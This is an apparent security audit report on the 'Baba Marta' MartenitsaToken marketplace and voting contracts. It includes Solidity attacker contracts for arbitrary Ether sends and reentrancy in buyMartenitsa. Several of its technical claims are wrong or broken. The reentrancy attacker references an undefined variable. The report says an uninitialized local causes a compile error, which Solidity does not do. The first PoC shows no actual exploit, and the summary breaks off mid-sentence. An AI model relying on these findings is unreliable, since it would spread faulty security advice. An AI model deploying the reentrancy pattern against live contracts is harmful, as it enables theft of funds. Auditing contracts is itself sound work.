# Smart Contract Audit README

## The Protocol
The "Baba Marta" protocol enables users to engage in the creation, buying, selling, and rewarding of digital tokens known as MartenitsaTokens. Producers can create and sell MartenitsaTokens, while all users, including producers, can participate in buying, giving away as presents, and collecting rewards based on the number of MartenitsaTokens they own. The protocol also includes a voting system where only producers can submit their MartenitsaTokens for consideration, and users can vote for the best token. The winning token receives a HealthToken as a reward. HealthTokens serve as rewards for users who own at least three different MartenitsaTokens and as a prize for the winner of the voting. Additionally, there's an exclusive event where participants, except producers, can temporarily become producers themselves, creating and selling MartenitsaTokens.

## Executive Summary
This security review of the 2024-04-Barba-Marta collection of smart contracts yielded a total of 6 unique vulnerabilities, among which  2 are rated to be in the category of HIGH severity, while 3 others are in the category of LOW severity. The contract

### Scope
The code base under review can be found in the 2024-04-Barba-Marta GitHub repository by Cyfrin, and is composed of a total of 5 smart contracts written in the Solidity programming language. These contracts inherit from a collection of 17 other smart contracts which have one or more of their features inherited.

### Severity Criteria
This review assessed the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

* Malicious Input Handling
* Escalation of privileges
* Arithmetic
* Gas use

#### High Risk Issues
##### The following critical issues were identified

* The 'buyMartenitsa' function of the 'MartenitsaMarketplace' contract sends eth to an arbitrary address. The function sends Ether to the seller address, which is obtained from the listing. If the seller address is malicious or controlled by an attacker, it could potentially execute arbitrary code when receiving Ether, leading to unexpected behavior.

###### Proof of Concept
In the 'buyMartenitsa' function, after verifying that the Martenitsa token is listed for sale and the buyer has sent enough Ether to cover the price, it transfers Ether to the seller using seller.call{value: salePrice}(""). This line uses the low-level call function to send Ether to the seller's address.

This function sends Ether to the seller address, which is obtained from the listing. If the seller address is malicious or controlled by an attacker, it could potentially execute arbitrary code when receiving Ether, leading to unexpected behavior or vulnerabilities.

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Attacker {
    MartenitsaMarketplace public marketplace;

    constructor(address _marketplace) {
        marketplace = MartenitsaMarketplace(_marketplace);
    }

    // Function to initiate the attack
    function initiateAttack(uint256 tokenId) external payable {
        // Call the vulnerable function with a large amount of Ether
        marketplace.buyMartenitsa{value: msg.value}(tokenId);
    }

    // Fallback function to receive Ether
    receive() external payable {}
}

contract MartenitsaMarketplace {
    mapping(uint256 => address) public tokenIdToSeller;

    function buyMartenitsa(uint256 tokenId) external payable {
        address seller = tokenIdToSeller[tokenId];
        
        // Vulnerable part: Sends Ether to seller's address
        (bool sent, ) = seller.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}
```

* The Attacker contract is created with the address of the 'MartenitsaMarketplace' contract.
* The 'initiateAttack' function is called with a specified tokenId and a large amount of Ether.
* Inside the 'buyMartenitsa' function of 'MartenitsaMarketplace', Ether is sent to the seller address using a low-level call.
* The seller address is retrieved from the 'tokenIdToSeller' mapping, which can potentially be manipulated by an attacker.
* By initiating the attack with a large amount of Ether and setting up an appropriate 'fallback' function to receive Ether in the Attacker contract, an attacker can potentially receive Ether sent by the 'MartenitsaMarketplace' contract to any address they control, demonstrating the vulnerability of sending Ether to an arbitrary address.

###### Recommended Mitigation Steps
It is recommended to follow the withdrawal pattern, where sellers withdraw Ether from the contract rather than having the contract send Ether to them automatically. This approach ensures that Ether transfers are controlled by the seller and reduces the attack surface for potential vulnerabilities. Additionally, using a more secure transfer method, such as 'transfer' or 'send', can provide additional safeguards against reentrancy and other vulnerabilities.


* Risk of reentrancy in the 'buyMartenitsa(uint256)' function of 'MartenitsaMarketplace' contract - lines 60-83. This is mainly because State variables are written after the call(s).

###### Proof of Concept
The function calls, martenitsaToken.updateCountMartenitsaTokensOwner(buyer, add) and martenitsaToken.updateCountMartenitsaTokensOwner(seller, sub) are external calls.

After these external calls, the state variable 'tokenIdToListing[tokenId]' is deleted. This state variable modification occurs after the external calls.

The state variable 'tokenIdToListing' is accessed and modified in multiple functions within the contract, including 'buyMartenitsa', 'getListing', and 'listMartenitsaForSale'. This could potentially lead to reentrancy vulnerabilities, as an attacker could call these functions recursively, exploiting the modification of state variables after external calls. 

There is thus a possibility of a reentrancy vulnerability in the 'buyMartenitsa' function. If an attacker can control the seller address, they may exploit this vulnerability to recursively call the 'buyMartenitsa' function before the state variable 'tokenIdToListing[tokenId]' is deleted, potentially leading to unexpected behavior or malicious actions.

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Attacker {
    MartenitsaMarketplace public marketplace;

    constructor(address _marketplace) {
        marketplace = MartenitsaMarketplace(_marketplace);
    }

    // Function to initiate the attack
    function initiateAttack(uint256 tokenId) external payable {
        // Call the vulnerable function with a large amount of Ether
        marketplace.buyMartenitsa{value: msg.value}(tokenId);
    }

    // Fallback function to re-enter the vulnerable function
    fallback() external payable {
        if (address(marketplace).balance >= msg.value) {
            marketplace.buyMartenitsa{value: msg.value}(tokenId);
        }
    }
}

contract MartenitsaMarketplace {
    mapping(uint256 => address) public tokenIdToSeller;
    mapping(address => uint256) public balances;

    function buyMartenitsa(uint256 tokenId) external payable {
        address seller = tokenIdToSeller[tokenId];
        
        // Vulnerable part: Sends Ether to seller's address
        (bool sent, ) = seller.call{value: msg.value}("");
        require(sent, "Failed to send Ether");

        // Update balances
        balances[msg.sender] += msg.value;
        balances[seller] -= msg.value;
    }
}
```

* The Attacker contract is created with the address of the 'MartenitsaMarketplace' contract.
* The 'initiateAttack' function is called with a specified tokenId and a large amount of Ether.
* Inside the 'buyMartenitsa' function of 'MartenitsaMarketplace', Ether is sent to the seller address using a low-level call.
* The 'fallback' function in the Attacker contract re-enters the 'buyMartenitsa' function if it receives Ether.
* By repeatedly re-entering the 'buyMartenitsa' function before it completes, an attacker can potentially drain the contract's balance or manipulate the contract's state in unexpected ways, constituting a risk of reentrancy in the function.

###### Recommended Mitigation Steps
To mitigate this vulnerability, it is recommended to ensure that state variable modifications are performed before any external calls, especially when dealing with user-provided addresses or inputs. Additionally, implementing reentrancy guards, such as using the Checks-Effects-Interactions pattern and limiting the amount of work done before external calls, can help prevent reentrancy attacks.


#### Medium Risk Findings
##### The following medium risk issues were found

* In the 'announceWinner()' function of the 'MartenitsaVoting' contract, the variable 'winnerTokenId' is declared but not initialized before its usage.

###### Proof of Concept
In Solidity, local variables must be initialized before being used, or else the compiler will raise a warning. Although in this case, Solidity doesn't raise a compilation error because the variable is being used within a loop where it's always initialized within the conditional statement. However, it's a good practice to initialize variables explicitly to avoid confusion and potential bugs.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract MartenitsaVoting {
    uint256[] private _tokenIds;
    mapping(uint256 => uint256) public voteCounts;

    function announceWinner() external {
        uint256 winnerTokenId; // Declaration without initialization
        uint256 maxVotes = 0;

        // For demonstration, let's assume there are no tokenIds in the _tokenIds array
        // In reality, this loop would iterate over actual tokenIds
        for (uint256 i = 0; i < _tokenIds.length; i++) {
            // This condition will never be true because _tokenIds array is assumed to be empty
            if (voteCounts[_tokenIds[i]] > maxVotes) {
                maxVotes = voteCounts[_tokenIds[i]];
                winnerTokenId = _tokenIds[i]; // Usage without prior initialization
            }
        }

        // For the sake of demonstration, let's print the winnerTokenId
        // This would result in a compilation error because winnerTokenId is not initialized
        // Uncommenting the next line would result in a compilation error
        // emit WinnerAnnounced(winnerTokenId, msg.sender);
    }
}
```

* A simplified version of the 'MartenitsaVoting' contract with only the necessary components to demonstrate the risks is created.
* In the 'announceWinner()' function, we declare the variable 'winnerTokenId' without initializing it.
* We assume that the '_tokenIds' array is empty for demonstration purposes, which means the loop iterating over '_tokenIds' will never execute its body.
* Inside the loop, we attempt to assign a value to 'winnerTokenId' based on a condition that will never be true.
* And then, we attempt to emit an event or perform some action using 'winnerTokenId', which would result in a compilation error due to the usage of an uninitialized variable.

This illustrates that in the absence of proper initialization, using the variable 'winnerTokenId' would lead to unexpected behavior or compilation errors.

###### Recommended Mitigation Steps
Initializing 'winnerTokenId' to a default value (like zero) before the loop would make the code clearer and help to avoid any potential issues.


#### Low Risk Findings
##### The following low risk findings were identified for improvements
* Consider adding more robust error handling and access control mechanisms.
* Enhance security measures to prevent manipulation of the voting process.
* Add events or functions for handling edge cases, such as ties or invalid token Ids.